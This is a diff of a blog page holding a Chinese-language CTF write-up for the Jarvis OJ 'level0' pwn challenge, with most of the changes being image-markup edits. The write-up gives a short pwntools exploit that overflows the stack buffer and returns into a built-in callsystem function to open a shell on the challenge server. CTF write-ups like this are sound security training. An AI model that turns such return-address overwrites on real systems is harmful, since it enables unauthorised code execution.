@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9881 level0.b9ded3801d6dd36a97468e128b81a65d   只开了NX  静态分析IDA F5，明显的溢出   在import中发现system，text中vuln上面发现内置的callsystem   那就很简单了，修改返回地址为callsystm直接getshell exploitoffset &#x3D; 136 &#x3D;">
+    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9881 level0.b9ded3801d6dd36a97468e128b81a65d   只开了NX                                                                                                             静态分析IDA F5，明显">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XMAN level0">
 <meta property="og:url" content="https://darkwing.moe/2019/05/15/XMAN-level0/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9881 level0.b9ded3801d6dd36a97468e128b81a65d   只开了NX  静态分析IDA F5，明显的溢出   在import中发现system，text中vuln上面发现内置的callsystem   那就很简单了，修改返回地址为callsystm直接getshell exploitoffset &#x3D; 136 &#x3D;">
+<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9881 level0.b9ded3801d6dd36a97468e128b81a65d   只开了NX                                                                                                             静态分析IDA F5，明显">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051501.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051502.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051503.jpg">
@@ -126,7 +126,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -216,19 +216,68 @@
 <p><a href="https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d" target="_blank" rel="noopener">level0.b9ded3801d6dd36a97468e128b81a65d</a></p>
 </blockquote>
 <p> 只开了NX</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051501.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051501.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>IDA F5，明显的溢出</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051502.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051503.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051502.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051503.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>在import中发现system，text中vuln上面发现内置的callsystem</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051504.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051505.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051504.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051505.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>那就很简单了，修改返回地址为callsystm直接getshell</p>
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>offset = 136 = 0x80 + 8</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051506.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051506.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level0'</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9881</span>)</span><br><span class="line"><span class="comment"># sh = process('./level0')</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">callsystem = elf.symbols[<span class="string">"callsystem"</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line">payload += p64(callsystem)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051507.jpg" alt=""></p>
+<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051507.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 
         </div>
 
